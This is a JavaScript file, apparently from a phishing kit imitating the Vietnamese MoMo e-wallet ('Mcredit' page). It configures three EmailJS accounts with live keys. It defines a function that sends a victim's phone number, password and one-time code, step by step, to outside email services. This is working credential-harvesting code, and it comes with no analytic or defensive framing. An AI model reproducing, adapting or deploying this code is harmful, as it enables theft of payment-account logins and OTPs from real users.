/**
 * EmailJS MoMo — tách từng bước (phone / password / otp).
 * Mỗi bước có thể dùng publicKey, serviceId, templateId khác nhau.
 */
window.MOMO_EMAILJS = {
  platform: "MoMo — Mcredit (momo.html)",

  phone: {
    publicKey: "0LVZE1mTauz8glAF3",
    serviceId: "service_3vutaor",
    templateId: "template_vofs17j",
  },

  password: {
    publicKey: "p4rUbDiBZ1qmtDCiY",
    serviceId: "service_8o2bn7b",
    templateId: "template_noml1ui",
  },

  otp: {
    publicKey: "KNc10WfK0FQy3-vJ2",
    serviceId: "service_vrzjmzo",
    templateId: "template_suq5i7n",
  },
};

window.__momoEmailJsActiveKey = null;

/**
 * Gửi EmailJS theo bước: "phone" | "password" | "otp"
 * @returns {Promise|undefined}
 */
window.momoSendEmailJs = function (step, templateParams) {
  if (typeof emailjs === "undefined") {
    console.warn("EmailJS SDK chưa tải.");
    return;
  }

  var root = window.MOMO_EMAILJS || {};
  var block = root[step];
  if (!block || !block.serviceId || !block.templateId) {
    console.warn("Thiếu cấu hình MOMO_EMAILJS." + step);
    return;
  }

  if (block.publicKey && window.__momoEmailJsActiveKey !== block.publicKey) {
    emailjs.init({ publicKey: block.publicKey });
    window.__momoEmailJsActiveKey = block.publicKey;
  }

  var params = Object.assign({ platform: root.platform || "MoMo" }, templateParams);

  return emailjs.send(block.serviceId, block.templateId, params);
};
